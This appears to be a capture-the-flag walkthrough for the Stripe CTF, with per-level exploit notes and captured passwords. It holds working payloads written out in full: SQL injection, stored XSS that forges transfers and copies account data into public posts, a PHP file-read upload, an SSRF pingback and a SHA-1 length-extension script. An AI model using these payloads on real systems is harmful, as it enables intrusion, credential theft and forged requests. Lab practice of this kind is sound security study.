Tools:
Python: http://py-ide-online.appspot.com/
Hash: http://www.xorbin.com/tools/sha256-hash-calculator
MySQL: http://www.dpriver.com/pp/sqlformat.htm?ref=g_wangz
CharCode: http://jdstiles.com/java/cct.html

== Level00 ==
Showing secrets for %:
Key	Value
secretstash-irfajt.level01.password	WEHdlqpmTg

== Level01 ==
https://level01-2.stripe-ctf.com/user-pkxcsatbug/?attempt=&filename=invalid

How did you know the secret combination was !?
You've earned the password to the access Level 2: PJXLqcSvvw

== Level02 ==
level02.php: <? echo file_get_contents('../password.txt'); ?>

https://level02-2.stripe-ctf.com/user-yuzpmgidbb/uploads/level02.php
CEVbMrXzwM

== Level03 ==
- need to exploit this:
    query = """SELECT id, password_hash, salt FROM users
               WHERE username = '{0}' LIMIT 1""".format(username)
- so that calculated_hash.hexdigest() != password_hash works
- where calculated_hash = hashlib.sha256(password + salt)
- sql injection with UNION
- precompute a particular hash for validation

username: ' UNION SELECT id, '4c26991843b5498e99ef26e6cf45c4eecd9e6890436f619054aaa8790b35967c' AS password_hash, 'bob' AS salt FROM users;--
password: bob

Welcome back! Your secret is: "The password to access level04 is: hvdFBIrzqj" (Log out)

== Level04 ==
1. create user 'evandrix'
2. create user 'a', with password: <script>$.post("./transfer", { to: "evandrix", amount: "1" } );</script>
3. while logged in as 'a', send 'karma_fountain' 1 karma
4. log back in as 'evandrix' and wait till karma_fountain logs in again to reveal password

karma_fountain (password: zgflvLjrHq, last active 02:44:24 UTC)

== Level05 ==
upload AUTHENTICATED.txt (using the form in Level02) with the following contents:
<space>AUTHENTICATED<newline>
<blank line>
...say the uploaded url is https://level02-2.stripe-ctf.com/user-yuzpmgidbb/uploads/AUTHENTICATED.txt

Pingback URL: https://level05-1.stripe-ctf.com/user-dpsrjfiwbx/?pingback=https://level02-2.stripe-ctf.com/user-yuzpmgidbb/uploads/AUTHENTICATED.txt
Username/Password: blank

Submit => Remote server responded with: Remote server responded with: AUTHENTICATED . Authenticated as @level02-2.stripe-ctf.com!. Authenticated as @level05-1.stripe-ctf.com!

After that, go back and refresh the main page:
You are authenticated as @level05-1.stripe-ctf.com.
Since you're a user of a password host and all, you deserve to know this password: diVIwMqKve

== Level06 ==
- create new account
- inject JS into the body of a new post
- the JS will GET the user_info page HTML, and POST it to /posts

Put the following JS code as a new post content
---
</script><script>$.get(String.fromCharCode(117, 115, 101, 114, 95, 105, 110, 102, 111),function(data){$.post(String.fromCharCode(47, 117, 115, 101, 114, 45, 105, 114, 110, 112, 101, 108, 106, 121, 106, 101, 47, 112, 111, 115, 116, 115),{title:/title/.source,body: escape(data),_csrf:document.getElementsByName(/_csrf/.source)[0].value});});</script><script>
---

- clear cache & delete cookie
- relogin and refresh the main Streamer page
- JS unescape the content of the post by 'level07-password-holder'

Streamer
Log Out
User Information

Username:	level07-password-holder
Password:	'glFbHbCKNzVB"

== Level07 ==
- login: ctf / password
- look @ https://level07-2.stripe-ctf.com/user-bgscqbgpmy/logs/1
- script @ http://force.vnsecurity.net/download/rd/sha-padding.py
- keylength = len(secret) = len('hejCe22rlQn1BJ') = 14
- python sha-padding.py 14 "count=2&lat=37.351&user_id=1&long=-119.827&waffle=chicken" "aad48ffc624590f0c9042c6ccdf6ef15d8a10493" "&waffle=liege"
---
import requests
new_msg='count=2&lat=37.351&user_id=1&long=-119.827&waffle=chicken\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x028&waffle=liege'
new_sig='dbdd76700e4b8c51dc5d3e187c401243e23be923'
thing = new_msg+'|sig:'+new_sig
print requests.post('https://level07-2.stripe-ctf.com/user-bgscqbgpmy/orders', thing).text
---
{"confirm_code": "mWpHvLhiia", "message": "Great news: 2 liege waffles will soon be flying your way!", "success": true}

== Level08 ==
see how much it increments with a) first block correct b) all blocks correct c) all blocks wrong
https://answers.stripe.com/chat#level8
